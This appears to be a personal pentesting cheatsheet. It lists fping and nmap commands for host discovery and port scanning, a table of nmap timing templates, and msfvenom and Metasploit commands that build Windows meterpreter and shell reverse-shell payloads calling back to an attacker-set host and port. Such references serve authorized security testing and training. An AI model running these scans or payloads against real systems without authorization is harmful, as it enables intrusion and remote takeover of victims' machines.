+++
title = "CHEATSHEET"
lastmod = 2024-05-02T08:23:10+02:00
draft = false
+++

This is my **pentesting cheatsheet**.

<div style="text-align: center;">
  <img src="../img/hacking-614833260.gif" alt="Image description" style="display: block; margin: 0 auto;" />
</div>

# RECONNAISSANCE
## Fping
fping differs from ping in that you can specify any number of targets on the command line, or specify a file containing the lists of targets to ping. 
fping also supports sending a specified number of pings to a target, or looping indefinitely (as in ping ). Unlike ping, fping is meant to be used in scripts, so its output is designed to be easy to parse.

```bash
fping 10.4.23.227
```
## Nmap
### Ping Sweep
```bash
sudo nmap -sn  192.168.56.0/24
```
Scan mutlipe IP
```bash
sudo nmap -sn  192.168.56.227 10.4.23.228 
```
Scan range of IP
```bash
sudo nmap -sn 10.4.23.227-240
```
Scan file with IP
```bash
sudo nmap -sn -iL <filename>
```

### TCP SYN Ping
```bash
sudo nmap -sn -PS 10.4.23.227
```
To set range ports:
```bash
sudo nmap -sn -PS1-1000 10.4.23.227
```
To set multple ports:
```bash
sudo nmap -sn -PS80,3389,445 10.4.23.227
```
To perfom **prot scan** with this technique simple remove **-sn** flag
```bash
sudo nmap -PS80,3389,445 10.4.23.227
```

### TCP ACK Ping Scan

```bash
sudo nmap -sn -PA 10.4.23.227
```
```bash
sudo nmap -sn -PE 10.4.23.227 --send-ip
```

### Timing Templates
This is the table where the **-T0-4** flags are explained

| Timing templates and their effects                                        | T0         | T1         | T2       | T3       | T4       | T5         |
|--------------------------------------------------------------------------|------------|------------|----------|----------|----------|------------|
| **Name**                                                                 | Paranoid   | Sneaky     | Polite   | Normal   | Aggressive | Insane     |
| **min-rtt-timeout**                                                      | 100 ms     | 100 ms     | 100 ms   | 100 ms   | 100 ms   | 50 ms      |
| **max-rtt-timeout**                                                      | 5 minutes  | 15 seconds | 10 seconds | 10 seconds | 1250 ms | 300 ms     |
| **initial-rtt-timeout**                                                  | 5 minutes  | 15 seconds | 1 second | 1 second | 500 ms   | 250 ms     |
| **max-retries**                                                          | 10         | 10         | 10       | 10       | 6        | 2          |
| **Initial (and minimum) scan delay (--scan-delay)**                      | 5 minutes  | 15 seconds | 400 ms   | 0        | 0        | 0          |
| **Maximum TCP scan delay**                                               | 5 minutes  | 15,000     | 1 second | 1 second | 10 ms    | 5 ms       |
| **Maximum UDP scan delay**                                               | 5 minutes  | 15 seconds | 1 second | 1 second | 1 second | 1 second   |
| **host-timeout**                                                         | 0          | 0          | 0        | 0        | 0        | 15 minutes |
| **script-timeout**                                                       | 0          | 0          | 0        | 0        | 0        | 10 minutes |
| **min-parallelism**                                                      | Dynamic, not affected by timing templates |
| **max-parallelism**                                                      | 1          | 1          | 1        | Dynamic  | Dynamic  | Dynamic    |
| **min-hostgroup**                                                        | Dynamic, not affected by timing templates |
| **max-hostgroup**                                                        | Dynamic, not affected by timing templates |
| **min-rate**                                                             | No minimum rate limit                    |
| **max-rate**                                                             | No maximum rate limit                    |
| **defeat-rst-ratelimit**                                                 | Not enabled by default                   |


-----
-----
# Payloads
## Msfvenom
### Reverse Shell
Reverse shell in C format
```bash
sudo msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.131.154 LPORT=9500 -f c
```
Reverse shell in binary format
```bash
sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.131.154 LPORT=443 -f raw -o code.bin
```
----
----
# C2 Framework
## Metasploit
While Metasploit is not a dedicated C2 framework, it can be used in conjunction with C2 capabilities for more advanced penetration testing and red teaming scenarios. Metasploit's **Meterpreter**, for instance, is a powerful payload that allows for interactive control over a compromised system, somewhat akin to C2 operations.

Use meterpreter for windows reverse shell
```bash
use payload/windows/x64/meterpreter_reverse_tcp
```

